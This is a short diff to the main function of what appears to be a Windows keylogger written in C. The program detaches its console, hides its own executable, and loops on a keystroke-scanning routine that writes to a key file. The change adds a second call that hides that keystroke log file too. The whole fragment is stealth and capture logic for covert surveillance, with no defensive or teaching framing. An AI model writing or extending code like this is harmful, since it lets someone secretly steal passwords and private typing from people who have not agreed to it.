@@ -22,7 +22,8 @@ int main(int argc, char **argv){
     FreeConsole();
     GetModuleFileName(NULL, cur_path, sizeof(cur_path));
     hide(cur_path);
-    sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);    
+    sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);
+    hide(cur_path);
     while(true){
         scanCode(cur_path);
     }
